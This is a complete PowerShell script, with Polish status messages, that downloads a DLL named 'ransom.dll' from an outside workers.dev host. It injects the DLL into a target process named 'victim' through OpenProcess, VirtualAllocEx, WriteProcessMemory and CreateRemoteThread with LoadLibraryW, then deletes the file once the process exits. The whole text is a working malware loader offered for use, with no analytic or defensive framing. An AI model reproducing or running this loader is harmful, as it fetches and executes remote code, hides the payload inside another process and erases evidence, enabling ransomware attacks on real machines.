$d = "$env:TEMP\ransom.dll"
$cel = (Get-Process victim -ErrorAction Stop | Select-Object -First 1).Id   # albo recznie: $cel = 1234
Invoke-WebRequest 'https://sune.michal52176.workers.dev/ransom.dll' -OutFile $d -UseBasicParsing
"[OK] pobrany: $d"
Add-Type @'
using System; using System.Runtime.InteropServices;
public class W {
  [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a,bool i,int p);
  [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr n,IntPtr s,uint t,uint pr);
  [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr n,byte[] b,IntPtr s,out int w);
  [DllImport("kernel32",CharSet=CharSet.Unicode)] public static extern IntPtr GetModuleHandleW(string x);
  [DllImport("kernel32",CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr m,string n);
  [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr at,IntPtr st,IntPtr fn,IntPtr pa,uint fl,out int tid);
  [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h,uint ms);
}
'@
$h  = [W]::OpenProcess(0x43A, $false, $cel)
$b  = [Text.Encoding]::Unicode.GetBytes($d + [char]0)
$m  = [W]::VirtualAllocEx($h, [IntPtr]::Zero, [IntPtr]$b.Length, 12288, 4)
$w  = 0; [W]::WriteProcessMemory($h, $m, $b, [IntPtr]$b.Length, [ref]$w)
$la = [W]::GetProcAddress([W]::GetModuleHandleW('kernel32'), 'LoadLibraryW')
$t  = 0; $th = [W]::CreateRemoteThread($h, [IntPtr]::Zero, [IntPtr]::Zero, $la, $m, 0, [ref]$t)
[W]::WaitForSingleObject($th, 15000)
if ($m -ne [IntPtr]::Zero) { "[OK] injected do pid=$cel" } else { "[BLAD] injection fail" }
"[..] czekam na koniec victima..."
while (Get-Process -Id $cel -ErrorAction SilentlyContinue) { Start-Sleep 2 }
Remove-Item $d -Force -ErrorAction SilentlyContinue
"[OK] cleaned"
